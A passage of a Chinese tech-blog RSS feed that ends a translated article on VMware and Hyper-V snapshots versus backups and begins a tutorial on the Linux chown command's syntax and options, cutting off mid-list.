&lt;p&gt;虚拟机快照只能在非生产环境创建，在非生产环境中，软件可以在一个不占用CPU的单独虚机上运行。就是说，如果将虚拟机从快照恢复到以前的状态可能会引起一些机器本身依赖的应用程序（Exchange,SharePoint,SQL Server..等)各层之间不兼容。&lt;/p&gt;
&lt;p&gt;&lt;span style=&quot;background-color: #ffffff;&quot;&gt;每个软件各层之间都会有不同的依赖，主要分为以下几层：&lt;/span&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span style=&quot;background-color: #ffffff;&quot;&gt;web前端&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span style=&quot;background-color: #ffffff;&quot;&gt;应用中间层&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span style=&quot;background-color: #ffffff;&quot;&gt;数据库后端&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;如果所有的这些都包含在一个单独虚机（比如SharePoint和SQL服务器)中，那么这个非生产环境可以很方便地创建快照。&lt;/p&gt;
&lt;p&gt;理想的情况就是在创建快照前关掉虚拟机。在不产生变化的状态下，尽管不能降低RAM，也可以节省很大的硬盘空间。&lt;/p&gt;
&lt;h1&gt;虚拟机备份&lt;/h1&gt;
&lt;p&gt;&lt;span style=&quot;background-color: #ffffff;&quot;&gt;虚拟机快照和备份最主要的区别在于：&lt;/span&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span style=&quot;background-color: #ffffff;&quot;&gt;一个虚机从备份恢复时，必须在启动状态&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span style=&quot;background-color: #ffffff;&quot;&gt;一个虚机从快照中恢复，可以在开机状态&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;微软卷影复制技术，也称为卷快照服务，是一个用于创建单时间点数据副本的Windows 服务器数据备份特性。&lt;/p&gt;
&lt;p&gt;Hyper-V有自己的VSS写入器，而VMware使用它的&lt;strong&gt;VDP&lt;/strong&gt;进行备份恢复。&lt;/p&gt;
&lt;p&gt;任何第三方备份产品为实现虚拟机备份，都会调用刚刚提及的一些技术的API。&lt;/p&gt;
&lt;p&gt;备份应该包含一些配置，虚拟机使用的虚拟机快照和虚拟硬盘。&lt;/p&gt;
&lt;p&gt;VMware借用第三方备份产品执行的主要操作如下：&lt;/p&gt;
&lt;h2&gt;备份一个VMware虚拟机&lt;/h2&gt;
&lt;p&gt;&lt;span style=&quot;background-color: #ffffff;&quot;&gt;1.连接包含目标虚拟机的服务器&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span style=&quot;background-color: #ffffff;&quot;&gt;2.通过服务器创建一个目标虚拟机的快照&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span style=&quot;background-color: #ffffff;&quot;&gt;3.通过服务器获得虚机磁盘和快照的文件的使用权&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span style=&quot;background-color: #ffffff;&quot;&gt;4.捕获虚机磁盘数据和虚机配置信息&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span style=&quot;background-color: #ffffff;&quot;&gt;5.通过服务器清除备份快照&lt;/span&gt;&lt;/p&gt;
&lt;h2&gt;从 VMware 虚拟机还原&lt;/h2&gt;
&lt;p&gt;你可以选择任意一种还原情景：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;将一个已存在的虚机还原到一个单独虚机&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;span style=&quot;background-color: #ffffff;&quot;&gt;连接到服务器，关掉目标虚机&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span style=&quot;background-color: #ffffff;&quot;&gt;通过server获取虚拟磁盘的使用权&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span style=&quot;background-color: #ffffff;&quot;&gt;在备份程序中传递磁盘的镜像&lt;/span&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;&lt;span style=&quot;background-color: #ffffff;&quot;&gt;完全重创虚机&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;span style=&quot;background-color: #ffffff;&quot;&gt;连接服务器&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span style=&quot;background-color: #ffffff;&quot;&gt;通过服务器使用上面提到的备份过程的第四步中的配置信息创建一个新的虚拟机和虚拟机的虚拟磁盘&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span style=&quot;background-color: #ffffff;&quot;&gt;将虚拟磁盘数据转移到一个新建的虚拟磁盘中。这里包含了虚拟磁盘的格式化信息，因此没有必要在虚拟磁盘上建立任何种类的文件系统。&lt;/span&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h1&gt;需要牢记什么？&lt;/h1&gt;
&lt;p&gt;执行VMware或者Hyper-V虚拟机备份都涉及到了虚拟机快照技术的应用，然而开始执行还原的时刻，备份和快照的情况是不一样的。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;&lt;span style=&quot;background-color: #ffffff;&quot;&gt;虚拟机从备份还原的时候必需在还原后才可以开机&lt;/span&gt;&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;span style=&quot;background-color: #ffffff;&quot;&gt;虚拟机从快照恢复时，可以保持开机状态&lt;/span&gt;&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;参考资料：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span style=&quot;background-color: #ffffff;&quot;&gt;VMware虚拟机快照：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span style=&quot;background-color: #ffffff;&quot;&gt;&lt;a style=&quot;background-color: #ffffff;&quot; href=&quot;http://kb.vmware.com/selfservice/microsites/search.do?language=en_US&amp;amp;cmd=displayKC&amp;amp;externalId=1015180&quot; target=&quot;_blank&quot;&gt;http://kb.VMware.com/selfservice/microsites/search.do?language=en_US&amp;amp;cmd=displayKC&amp;amp;externalId=1015180&lt;/a&gt;&lt;/span&gt;&lt;br&gt;
&lt;span style=&quot;background-color: #ffffff;&quot;&gt;Hyper-V VM snapshot: &lt;a style=&quot;background-color: #ffffff;&quot; href=&quot;http://technet.microsoft.com/en-us/library/dd560637(v=WS.10).aspx&quot; target=&quot;_blank&quot;&gt;http://technet.microsoft.com/en-us/library/dd560637(v=WS.10).aspx&lt;/a&gt;&lt;/span&gt;&lt;span style=&quot;background-color: #ffffff;&quot;&gt; &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span style=&quot;background-color: #ffffff;&quot;&gt;VMware备份：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span style=&quot;background-color: #ffffff;&quot;&gt;&lt;a style=&quot;background-color: #ffffff;&quot; href=&quot;https://www.vmware.com/support/developer/vddk/vcb_vsphere_backup.pdf&quot; target=&quot;_blank&quot;&gt;https://www.VMware.com/support/developer/vddk/vcb_vsphere_backup.pdf&lt;/a&gt;&lt;/span&gt;&lt;br&gt;
&lt;span style=&quot;background-color: #ffffff;&quot;&gt;Hyper-V backup: &lt;a style=&quot;background-color: #ffffff;&quot; href=&quot;http://technet.microsoft.com/en-us/library/dd252619.aspx&quot; target=&quot;_blank&quot;&gt;http://technet.microsoft.com/en-us/library/dd252619.aspx&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;

        
            &lt;blockquote class=&quot;rewards&quot;&gt;
        &lt;p&gt;&lt;strong&gt;打赏支持我翻译更多好文章，谢谢！&lt;/strong&gt;&lt;/p&gt;
        &lt;a href=&quot;#rewardbox&quot; id=&quot;rewards-button&quot; class=&quot;fancybox&quot;&gt;&lt;span class=&quot;btn-bluet-blue href-style&quot;&gt;&lt;i class=&quot;fa fa-jpy&quot;&gt;&lt;/i&gt; 打赏译者&lt;/span&gt;&lt;/a&gt;
    &lt;/blockquote&gt;

    &lt;div id=&quot;rewardbox&quot;&gt;
        &lt;h4&gt;打赏支持我翻译更多好文章，谢谢！&lt;/h4&gt;
                &lt;p&gt;任选一种支付方式&lt;/p&gt;
                
    &lt;/div&gt;

    
        
    &lt;div class=&quot;post-adds&quot;&gt;
        &lt;span data-post-id=&quot;109703&quot; class=&quot; btn-bluet-bigger href-style vote-post-up   register-user-only &quot;&gt;&lt;i class=&quot;fa  fa-thumbs-o-up&quot;&gt;&lt;/i&gt; &lt;h10 id=&quot;109703votetotal&quot;&gt;1&lt;/h10&gt; 赞&lt;/span&gt;
        &lt;span data-book-type=&quot;1&quot; data-site-id=&quot;2&quot; data-item-id=&quot;109703&quot; data-item-type=&quot;1&quot; class=&quot; btn-bluet-bigger href-style bookmark-btn  register-user-only &quot;&gt;&lt;i class=&quot;fa fa-bookmark-o  &quot;&gt;&lt;/i&gt;  收藏&lt;/span&gt;

                    &lt;a href=&quot;#article-comment&quot;&gt;&lt;span class=&quot;btn-bluet-bigger href-style hide-on-480&quot;&gt;&lt;i class=&quot;fa fa-comments-o&quot;&gt;&lt;/i&gt;  评论&lt;/span&gt;&lt;/a&gt;
        
        
        
        &lt;!-- JiaThis Button BEGIN --&gt;
        &lt;div class=&quot;jiathis_style_24x24&quot; style=&quot;display: inline-flex; position: relative; margin: 0; clear: both;float: right;&quot;&gt;
            &lt;a class=&quot;jiathis_button_tsina&quot;&gt;&lt;/a&gt;
            &lt;a class=&quot;jiathis_button_weixin&quot;&gt;&lt;/a&gt;
            &lt;a class=&quot;jiathis_button_qzone&quot;&gt;&lt;/a&gt;
            &lt;a class=&quot;jiathis_button_fb hide-on-480&quot;&gt;&lt;/a&gt;
            &lt;a href=&quot;http://www.jiathis.com/share?uid=1745061&quot; class=&quot;jiathis jiathis_txt jiathis_separator jtico jtico_jiathis&quot; target=&quot;_blank&quot;&gt;&lt;/a&gt;
        &lt;/div&gt;

    &lt;/div&gt;




        &lt;!-- BEGIN #author-bio --&gt;

&lt;div id=&quot;author-bio&quot;&gt;
	
	&lt;h3 class=&quot;widget-title&quot;&gt;
	关于作者：&lt;a target=&quot;_blank&quot; href=&quot;http://www.jobbole.com/members/2937134480&quot;&gt;百焱&lt;/a&gt;
	&lt;/h3&gt;
	&lt;div class=&quot;alignleft&quot;&gt;
		&lt;a target=&quot;_blank&quot; href=&quot;http://www.jobbole.com/members/2937134480&quot;&gt;
			&lt;img src=&quot;/images/jobbole.com/2f9bffe5fad98ac8721ba7919c1752c6.jpg&quot;&gt;
		&lt;/a&gt;
	&lt;/div&gt;

    &lt;div class=&quot;author-bio-info&quot;&gt;

        &lt;span class=&quot;author-bio-info-block&quot;&gt;
            选最难走的路        &lt;/span&gt;
        &lt;span class=&quot;author-bio-info-block&quot;&gt;
            &lt;a href=&quot;http://www.jobbole.com/members/2937134480&quot; target=&quot;_blank&quot;&gt;&lt;i class=&quot;fa fa-user&quot;&gt;&lt;/i&gt; 个人主页&lt;/a&gt; ·
            &lt;a href=&quot;http://blog.jobbole.com/author/2937134480/&quot; target=&quot;_blank&quot;&gt;&lt;i class=&quot;fa fa-file-text-o&quot;&gt;&lt;/i&gt; 我的文章&lt;/a&gt;

             · &lt;a title=&quot;声望值&quot; target=&quot;_blank&quot; href=&quot;http://www.jobbole.com/members/2937134480/reputation/&quot;&gt;&lt;i class=&quot;fa fa-graduation-cap&quot;&gt;&lt;/i&gt; 19&lt;/a&gt; · &lt;a title=&quot;我的网站&quot; target=&quot;_blank&quot; href=&quot;http://zhangzhengjiao.com&quot;&gt;&lt;i class=&quot;fa fa-link&quot;&gt;&lt;/i&gt;&lt;/a&gt; &lt;a title=&quot;微博主页&quot; target=&quot;_blank&quot; href=&quot;http://weibo.com/2937134480&quot;&gt;&lt;i class=&quot;fa fa-weibo&quot;&gt;&lt;/i&gt;&lt;/a&gt; &lt;a title=&quot;QQ：379047366&quot; target=&quot;_blank&quot; href=&quot;#&quot;&gt;&lt;i class=&quot;fa fa-qq&quot;&gt;&lt;/i&gt;&lt;/a&gt; &lt;a title=&quot;个人微信：zzj379047366&quot; target=&quot;_blank&quot; href=&quot;#&quot;&gt;&lt;i class=&quot;fa fa-weixin&quot;&gt;&lt;/i&gt;&lt;/a&gt;         &lt;/span&gt;
    &lt;/div&gt;
	&lt;div class=&quot;clear&quot;&gt;&lt;/div&gt;
&lt;/div&gt;

&lt;!-- END #author-bio --&gt;
	

</description>
        <pubDate>Tue, 10 Jan 2017 00:00:00 +0800</pubDate>
        <link>http://iftti.com/posts/2017/2017-01-10-109703-ed6ba8bc8.html</link>
        <guid isPermaLink="true">http://iftti.com/posts/2017/2017-01-10-109703-ed6ba8bc8.html</guid>
        
        
        <category>jobbole</category>
        
      </item>
    
      <item>
        <title>每天一个 Linux 命令（30）:  chown 命令</title>
        <description>


        			&lt;div class=&quot;textwidget&quot;&gt;
&lt;/div&gt;
		
		&lt;p class=&quot;p0&quot;&gt;chown将指定文件的拥有者改为指定的用户或组，用户可以是用户名或者用户ID；组可以是组名或者组ID；文件是以空格分开的要改变权限的文件列表，支持通配符。系统管理员经常使用chown命令，在将文件拷贝到另一个用户的名录下之后，让用户拥有使用该文件的权限。&lt;/p&gt;
&lt;p class=&quot;p0&quot;&gt;&lt;strong&gt;1．命令格式：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587abc0e58b85077307312&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;span class=&quot;crayon-language&quot;&gt;Shell&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
chown [选项]... [所有者][:[组]] 文件...&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587abc0e58b85077307312-1&quot;&gt;1&lt;/div&gt;&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587abc0e58b85077307312-1&quot;&gt;
&lt;span class=&quot;crayon-r&quot;&gt;chown&lt;/span&gt; &lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;选项&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;所有者&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;组&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt; 文件&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0007 seconds] --&gt;
&lt;p&gt;&lt;/p&gt;
&lt;p class=&quot;p0&quot;&gt;&lt;strong&gt;2．命令功能：&lt;/strong&gt;&lt;/p&gt;
&lt;p class=&quot;p0&quot;&gt;通过chown改变文件的拥有者和群组。在更改文件的所有者或所属群组时，可以使用用户名称和用户识别码设置。普通用户不能将自己的文件改变成其他的拥有者。其操作权限一般为管理员。&lt;/p&gt;
&lt;p class=&quot;p0&quot;&gt;&lt;strong&gt;3．命令参数：&lt;/strong&gt;&lt;/p&gt;
&lt;p class=&quot;p0&quot;&gt;&lt;strong&gt;必要参数:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587abc0e58b90941168282&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;span class=&quot;crayon-language&quot;&gt;Shell&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
-c 显示更改的部分的信息
-f 忽略错误信息
-h 修复符号链接
-R 处理指定目录以及其子目录下的所有文件
-v 显示详细的处理信息
-deference 作用于符号链接的指向，而不是链接文件本身&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587abc0e58b90941168282-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587abc0e58b90941168282-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587abc0e58b90941168282-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587abc0e58b90941168282-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587abc0e58b90941168282-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587abc0e58b90941168282-6&quot;&gt;6&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587abc0e58b90941168282-1&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;c&lt;/span&gt; 显示更改的部分的信息&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587abc0e58b90941168282-2&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;f&lt;/span&gt; 忽略错误信息&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587abc0e58b90941168282-3&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;h&lt;/span&gt; 修复符号链接&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587abc0e58b90941168282-4&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;R&lt;/span&gt; 处理指定目录以及其子目录下的所有文件&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587abc0e58b90941168282-5&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;v&lt;/span&gt; 显示详细的处理信息&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587abc0e58b90941168282-6&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;deference&lt;/span&gt; 作用于符号链接的指向，而不是链接文件本身&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0010 seconds] --&gt;
&lt;p&gt;&lt;/p&gt;
&lt;p class=&quot;p0&quot;&gt;&lt;strong&gt;选择参数:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587abc0e58b95647014400&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;span class=&quot;crayon-language&quot;&gt;Shell&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
--reference=&amp;lt;目录或文件&amp;gt; 把指定的目录/文件作为参考，把操作的文件/目录设置成参考文件/目录相同拥有者和群组
--from=&amp;lt;当前用户：当前群组&amp;gt; 只有当前用户和群组跟指定的用户和群组相同时才进行改变
--help 显示帮助信息
--version 显示版本信息&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587abc0e58b95647014400-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587abc0e58b95647014400-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587abc0e58b95647014400-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587abc0e58b95647014400-4&quot;&gt;4&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587abc0e58b95647014400-1&quot;&gt;
